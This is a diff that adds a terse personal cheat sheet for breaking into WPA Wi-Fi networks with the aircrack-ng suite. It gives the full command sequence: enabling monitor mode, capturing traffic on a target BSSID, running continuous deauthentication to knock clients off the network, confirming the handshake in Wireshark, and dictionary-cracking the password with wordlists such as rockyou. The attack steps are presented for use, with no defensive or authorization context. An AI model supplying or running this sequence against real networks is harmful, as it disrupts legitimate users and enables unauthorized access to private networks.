@@ -1,0 +1,47 @@
+root#
+
+airmon-ng
+airmon-ng start [Interface]
+airmon-ng start wlan0
+
+stop --> ctrl+c
+
+airodump-ng -c [channel/CH] -w [name_file] -d [BSSID] wlan0mon
+EXAMPLE:
+airodump-ng -c 6 -w capture -d 00:00:00:00:00:00 wlan0mon
+____________________________________________________________________________
+
+knock the cilent of the network
+
+new tab --> ctrl+shift+t
+aireplay-ng --deauth 0 -a [BSSID] wlan0mon
+or
+aireplay-ng --deauth 0 -a [BSSID] -c [STATION] wlan0mon
+EXAMPLE:
+aireplay-ng --deauth 0 -a 00:00:00:00:00:00 wlan0mon
+
+
+wait for WPA handshake
+____________________________________________________________________________
+
+after WPA handshake show up, stop all--> ctrl+c
+
+	ls
+	wireshark capture-01.cap
+	filter --> eapol
+	press Enter
+	you can see the handshakes!
+	close wireshark
+
+____________________________________________________________________________
+
+stop monitoring that wireless interface --> airmon-ng stop wlan0mon
+
+crack the password
+
+aircrack-ng [cap_file] -w [file_wordlist]
+EXAMPLE:
+aircrack-ng enl-01.cap -w /usr/share/dict/wordlist-probable.txt
+aircrack-ng enl-01.cap -w /media/hasfer/Echo/aircrack/wordlist/wordlist/rockyou
+
+____________________________________________________________________________
